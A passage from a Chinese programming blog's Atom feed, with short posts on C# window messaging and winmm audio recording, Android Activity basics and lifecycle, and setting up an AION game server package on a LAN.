    <content type="html"><![CDATA[<p>  Form2，向Form1发送消息 <code>0x0444</code>为自定义进程间通信代码。</p><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> IntPtr ip = IntPtr.Zero;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;user32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">SendMessage</span>(<span class="params">IntPtr a, <span class="built_in">int</span> b, <span class="built_in">int</span> c, <span class="built_in">string</span> d</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;User32.dll&quot;</span>, EntryPoint = <span class="meta-string">&quot;FindWindow&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">extern</span> <span class="keyword">static</span> IntPtr <span class="title">FindWindow</span>(<span class="params"><span class="built_in">string</span> lpClassName, <span class="built_in">string</span> lpWindowName</span>)</span>;</span><br><span class="line"></span><br><span class="line">ip = FindWindow(<span class="literal">null</span>, <span class="string">&quot;Form1&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (ip == IntPtr.Zero)</span><br><span class="line">&#123;</span><br><span class="line">   MessageBox.Show(<span class="string">&quot;Form1未运行。&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   SendMessage(<span class="keyword">this</span>.ip, <span class="number">0x0444</span>, <span class="number">100</span>, <span class="string">&quot;ssss&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  Form1，等待接收消息并进行相应处理 <span class="comment">//需要重载DefWndProc方法</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">DefWndProc</span>(<span class="params"><span class="keyword">ref</span> System.Windows.Forms.Message m</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (m.Msg)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x0444</span>:<span class="comment">//处理消息</span></span><br><span class="line">         <span class="comment">//do something</span></span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      <span class="literal">default</span>:</span><br><span class="line">         <span class="keyword">base</span>.DefWndProc(<span class="keyword">ref</span> m);<span class="comment">//调用基类函数处理非自定义消息。</span></span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  Form2，向Form1发送消息 &lt;code&gt;0x0444&lt;/code&gt;为自定义进程间通信代码。&lt;/p&gt;
&lt;figure class=&quot;highlight cs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;</summary>
      
    
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/categories/NET/"/>
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>C Sharp开发手记--录音功能的简洁实现</title>
    <link href="https://coder.lufer.cc/CSharp/C%20Sharp%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0--%E5%BD%95%E9%9F%B3%E5%8A%9F%E8%83%BD%E7%9A%84%E7%AE%80%E6%B4%81%E5%AE%9E%E7%8E%B0/"/>
    <id>https://coder.lufer.cc/CSharp/C%20Sharp%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0--%E5%BD%95%E9%9F%B3%E5%8A%9F%E8%83%BD%E7%9A%84%E7%AE%80%E6%B4%81%E5%AE%9E%E7%8E%B0/</id>
    <published>2016-05-30T14:00:51.000Z</published>
    <updated>2021-04-06T02:15:02.153Z</updated>
    
    <content type="html"><![CDATA[<p>  系统级的API提供了非常简单的录音功能实现方式，将声音录制为wave格式。</p><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//调用系统API</span></span><br><span class="line"></span><br><span class="line">\[DllImport(<span class="string">&quot;winmm.dll&quot;</span>, EntryPoint = <span class="string">&quot;mciSendString&quot;</span>, CharSet = CharSet.Auto)\]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">int</span> <span class="title">mciSendString</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="built_in">string</span> lpstrCommand,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="built_in">string</span> lpstrReturnString,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="built_in">int</span> uReturnLength,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="built_in">int</span> hwndCallback</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//开始录音</span></span><br><span class="line"></span><br><span class="line">mciSendString(<span class="string">&quot;set wave bitpersample 8&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">mciSendString(<span class="string">&quot;set wave samplespersec 20000&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">mciSendString(<span class="string">&quot;set wave channels 2&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">mciSendString(<span class="string">&quot;set wave format tag pcm&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">mciSendString(<span class="string">&quot;open new type WAVEAudio alias movie&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">mciSendString(<span class="string">&quot;record movie&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存文件</span></span><br><span class="line"></span><br><span class="line">mciSendString(<span class="string">&quot;stop movie&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">mciSendString(<span class="string">&quot;save movie D:\\\i.wav&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">mciSendString(<span class="string">&quot;close movie&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  系统级的API提供了非常简单的录音功能实现方式，将声音录制为wave格式。&lt;/p&gt;
&lt;figure class=&quot;highlight cs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;</summary>
      
    
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/categories/NET/"/>
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>AION167版本一键端架设方式</title>
    <link href="https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/AION167%E7%89%88%E6%9C%AC%E4%B8%80%E9%94%AE%E7%AB%AF%E6%9E%B6%E8%AE%BE%E6%96%B9%E5%BC%8F/"/>
    <id>https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/AION167%E7%89%88%E6%9C%AC%E4%B8%80%E9%94%AE%E7%AB%AF%E6%9E%B6%E8%AE%BE%E6%96%B9%E5%BC%8F/</id>
    <published>2016-05-23T05:14:27.000Z</published>
    <updated>2021-09-14T09:13:02.215Z</updated>
    
    <content type="html"><![CDATA[<p>  云盘链接https://yunpan.cn/cSPXUiRhCQhyF （提取码：a168）</p><p>  带167版本客户端与服务端</p><p>  局域网联机修改方式：<br />  数据库中server表IP地址可以填*也可以填内网IP。<br />  GS中的ipconfig如果开外网，就填公网ip，如果局域网就填内网ip。<br />  network.properties 中120.0.0.1全部改为内网IP。<br />  LS和CS中的properties改内网IP。<br />  登录器改成和ipconfig一样即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  云盘链接https://yunpan.cn/cSPXUiRhCQhyF （提取码：a168）&lt;/p&gt;
&lt;p&gt;  带167版本客户端与服务端&lt;/p&gt;
&lt;p&gt;  局域网联机修改方式：&lt;br /&gt;
  数据库中server表IP地址可以填*也可以填内网IP。&lt;br /&gt;
  </summary>
      
    
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title>Activity的基本使用</title>
    <link href="https://coder.lufer.cc/Java/Activity%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>https://coder.lufer.cc/Java/Activity%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2016-03-30T08:10:38.000Z</published>
    <updated>2021-04-06T02:17:40.276Z</updated>
    
    <content type="html"><![CDATA[<p>1.Activity布局的绑定。</p><p>  onCreate()方法中提供了以下函数，用于进行xml文件布局的绑定。</p><p>  <code>setContentView(R.layout.activity_main);</code></p><p>2.Activity的切换</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Intent intent2&#x3D;new Intent();</span><br><span class="line">intent2.setClass(this, Login.class);&#x2F;&#x2F;方法2</span><br><span class="line">startActivity(intent2);</span><br></pre></td></tr></table></figure><p>3.Toast</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Toast toast;</span><br><span class="line">toast &#x3D; Toast.makeText(MainActivity.this, &quot;显示的信息&quot;, Toast.LENGTH_SHORT);</span><br><span class="line">toast.setGravity(Gravity.CENTER, 0, 0);</span><br><span class="line">toast.show();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.Activity布局的绑定。&lt;/p&gt;
&lt;p&gt;  onCreate()方法中提供了以下函数，用于进行xml文件布局的绑定。&lt;/p&gt;
&lt;p&gt;  &lt;code&gt;setContentView(R.layout.activity_main);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.Act</summary>
      
    
    
    
    <category term="Android" scheme="https://coder.lufer.cc/categories/Android/"/>
    
    
    <category term="Android" scheme="https://coder.lufer.cc/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Android四大组件--Activity的生命周期</title>
    <link href="https://coder.lufer.cc/Java/Android%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6--Activity%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
    <id>https://coder.lufer.cc/Java/Android%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6--Activity%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</id>
    <published>2016-03-30T07:25:03.000Z</published>
    <updated>2021-04-06T02:17:44.487Z</updated>
    
    <content type="html"><![CDATA[<p></p><p><img src="http://hi.csdn.net/attachment/201109/1/0_1314838777He6C.gif" alt="" /></p><p>  一个完整的生命周期从Activity被启动开始，，onCreat()方法被调用，Activity被成功创建，然后调用onStart()方法，开始运行Activity，但是Activity的机制使得Start只是一个中间状态，当onResume()方法被调用时，Activity才会真正运行，屏幕上开始显示Activity的界面。</p><p>  当在Activity中点击一些控件，导致跳转到其他的Activity时，由于Activity是以栈的形式存在，遵循先进后出的原则，跳转后之前的Activity不会被销毁，而是调用了onPause()方法进入后台暂停状态。</p><p>  这时的Activity进入了分支阶段：</p><p>  如果这个Activity不可视，调用onStop()方法先将其停止，进入下一分支</p><p>  如果程序运行结束，调用onDestroy()进行销毁，至此完成一个生命周期。</p><p>  如果再次切换到此Activity(例如Activity跳转或者新调用的Activity被退出),此时调用onRestart()方法重启此Activity，回到onStart()阶段。</p><p>  如果系统内存不足，需要释放内存，同样会将此Activity进行销毁，在需要调用此Activity时重新OnCreat()。</p><p>  如果ActivityPause之后又回到了最上面，则直接调用onResume()方法，继续运行Activity。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://hi.csdn.net/attachment/201109/1/0_1314838777He6C.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;  一个完整的生命周期从Activity被启动开始，，onCreat()方法被调用</summary>
      
    
    
    
    <category term="Android" scheme="https://coder.lufer.cc/categories/Android/"/>
    
    
    <category term="Android" scheme="https://coder.lufer.cc/tags/Android/"/>
    
  </entry>
  
</feed>
